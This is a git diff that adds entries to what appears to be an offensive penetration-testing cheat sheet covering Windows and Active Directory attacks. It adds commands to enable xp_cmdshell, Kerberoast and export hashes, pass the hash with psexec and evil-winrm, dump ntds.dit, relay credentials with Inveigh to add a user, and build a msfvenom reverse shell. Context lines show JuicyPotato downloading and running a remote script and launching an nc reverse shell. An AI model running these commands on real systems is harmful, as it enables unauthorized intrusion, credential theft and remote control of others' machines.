@@ -175,6 +175,18 @@ SELECT @@version
 SELECT DB_NAME()
 SELECT name FROM master..sysdatabases;
 
+# Enable xp_cmdshell
+sp_configure 'show advanced options', '1'
+RECONFIGURE
+sp_configure 'xp_cmdshell', '1'
+RECONFIGURE
+EXEC master..xp_cmdshell 'whoami'
+
+# sqsh
+sqsh -U sa -P password -S 10.10.10.10
+	* EXEC master..xp_cmdshell 'whoami'
+	* go
+
 ```
 
 ### 2049 (NFS MOUNT)
@@ -425,6 +437,7 @@ extension
 /etc/shadow
 /etc/hosts
 /etc/knockd.conf
+/etc/exports
 
 #(1)-----[/var/log/mail.log]-----
 nc 10.10.10.10 25
@@ -648,6 +661,16 @@ powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 Invoke-Mimikatz -DumpCreds
 ```
 
+### Invoke-Kerberoast.ps1
+
+```bash
+# Download
+https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+
+# Commands
+Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
+Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | out-file hash.txt -Width 8000
+```
 ### Sharphound.ps1
 
 ```code
@@ -657,7 +680,7 @@ https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/Shar
 # Commands
 Invoke-Bloodhound -CollectionMethod All -Domain bank.local
 Invoke-Bloodhound -CollectionMethod All 
-
+Invoke-Bloodhound -CollectionMethod All -ZipFileName test.zip
 ```
 
 ### jq
@@ -702,6 +725,9 @@ stop-process -id 500 -force
 
 # Wget
 wget 10.10.10.10/output.txt -outfile output.txt
+
+# Find file (recursive)
+Get-ChildItem -Path C:\ -Filter ntds.dit -Recurse -ErrorAction SilentlyContinue -Force
 
 
 ```
@@ -856,6 +882,10 @@ secretsdump.py -ntds ntds.dit -system system local -history
 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
 wmiexec.py -hashes :0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
 
+# psexec.py
+psexec.py BANK\Administrator@10.10.10.10 -hashes 'aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0ax06b98c579x65e6'
+psexec.py bank.local/nik:'Password@123'@10.10.10.10
+
 # smbclient.py
 smbclient.py bank.local/nik:'Password@123'@10.10.10.10
 
@@ -970,17 +1000,92 @@ Link : https://github.com/BushidoUK/CTI-Lexicon/blob/main/Lexicon.md
 ### Powerview.ps1
 
 ```code
+# Download
+git clone https://github.com/PowerShellMafia/PowerSploit.git
+
 # Commands
 Get-DomainComputer
 Get-DomainComputer -properties name
 Get-DomainTrustMapping -Verbose
 Get-DomainTrust
+Get-NetForest
+Get-NetForestDomain
+Get-NetForestTrust
 (get-domaincomputer -domain bank.local).dnshostname
+Get-NetLoggedon
+Get-NetProcess
+Invoke-ShareFinder
+Invoke-UserHunter
+
 
 
 # References
 https://gist.github.com/macostag/44591910288d9cc8a1ed6ea35ac4f30f
 https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+```
+
+### Active Directory
+
+```bash
+# Commands
+net user /domain
+net group /domain
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# LDAP
+======script(domain)======
+$domainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$Pdc = ($domainObject.PdcRoleOwner).Name
+$searchString = "LDAP://"
+$searchString += $Pdc + "/"
+$Name = "DC=$($domainObject.Name.Replace('.', ',DC='))"
+$searchString += $Name
+$search = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$searchString)
+$objectDomain = New-Object System.DirectoryServices.DirectoryEntry
+$search.SearchRoot = $objectDomain
+$search.filter="samAccountType=805306368"
+$res = $search.FindAll() | Sort-Object path
+==================
+
+======script(Local)=====
+$Searcher = New-Object DirectoryServices.DirectorySearcher
+$Searcher.SearchRoot = 'LDAP://CN=Users,DC=bank,DC=local'
+$Searcher.Filter = '(&(objectCategory=person))'
+$res = $Searcher.FindAll()  | Sort-Object path
+===================
+
+# LDAP References
+https://gist.github.com/Erreinion/76660c012ad05ab90182
+
+# .Net Method
+=====ADForestInfo====
+$ADForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+$ADForestInfo.Name
+$ADForestInfo.Sites
+$ADForestInfo.Domains
+$ADForestInfo.GlobalCatalogs
+$ADForestInfo.ApplicationPartitions
+$ADForestInfo.ForestMode
+$ADForestInfo.RootDomain
+$ADForestInfo.Schema
+$ADForestInfo.SchemaRoleOwner
+$ADForestInfo.NamingRoleOwner
+OR
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Name
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Sites
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Domains
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ApplicationPartitions
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ForestMode
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().RootDomain
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Schema
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().SchemaRoleOwner
+[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().NamingRoleOwner
+=====================
+
+
+# .Net Method References
+https://adsecurity.org/?p=113
 ```
 
 ### PowerUpSQL.ps1
@@ -997,11 +1102,30 @@ Get-SQLQuery -instance query.bank.local -query "select * from master..sysservers
 https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
 ```
 
+### Inveigh
+
+```bash
+# Commands
+Invoke-InveighRelay -ConsoleOutput -Y -StatusOutput N -Command "net user commandtest Passw0rd123! /add" -Attack Enumerate,Execute,Session
+Invoke-Inveigh -ConsoleOutput Y
+Stop-Inveigh
+Invoke-Inveigh -FileOutput Y
+```
 ### Metasploit
 
 ```
 # Set Proxies
 set PROXIES HTTP:127.0.0.1:8080
+
+# Mimikatz
+load mimikatz
+
+# Commands
+ps
+help
+
+# Msfvenom
+msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f raw -o shell.php
 ```
 
 ### Nessus
@@ -1087,6 +1211,22 @@ https://github.com/MobSF/mobsfscan
 ```bash
 # Commands
 evil-winrm -u 'Administrator'  -H '370ddcf45959b2293427baa70376e14e' -i 10.10.10.10
+```
+
+### Reminna
+
+```bash
+# Download
+https://remmina.org/how-to-install-remmina/
+
+# Installing
+sudo apt install software-properties-common
+sudo apt update
+sudo apt-add-repository ppa:remmina-ppa-team/remmina-next
+sudo apt update
+sudo apt install remmina remmina-plugin-rdp remmina-plugin-secret
+sudo killall remmina
+sudo remmina
 ```
 
 # C. SUID/CAP/SUDO/GROUP
@@ -1184,6 +1324,8 @@ sudo /usr/bin/snap install test.snap --dangerous --devmode
 ```bash
 # Sudo
 sudo msfconsole -x bash
+
+# Commands
 ```
 
 ### Docker
@@ -1312,6 +1454,8 @@ python exploit.py 10.10.10.4 7 445
 # Tecnique 1
 wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
 PrintSpoofer.exe -i -c cmd
+.\PrintSpoofer.exe -i -c "whoami"
+.\PrintSpoofer.exe -i -c "powershell ls"
 
 # Technique 2
 ##First
@@ -1328,6 +1472,10 @@ SweetPotato.exe -a "whoami"
 wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
+
+# Metasploit
+
 ```
 
 ### SeBackupPrivilege 
@@ -1366,6 +1514,7 @@ reg save hklm\system c:\Temp\system
 cd C:\Temp
 download ntds.dit
 download system
+secretsdump.py -ntds ntds.dit -system system local
 
 # References
 https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
@@ -1765,6 +1914,14 @@ https://www.exploit-db.com/exploits/49584
 # Payload (UrlDecode)
 # Execute File
 ?search= {.exec|wscript.exe //B //NOLOGO %TEMP%\payload.vbs.}
+```
+
+### Phreebooks
+
+```bash
+# PhreeBooks 5.2.3 ERP - Remote Code Execution
+https://www.exploit-db.com/exploits/49524
+https://www.exploit-db.com/exploits/46645
 ```
 # F. Reverse Shell
 
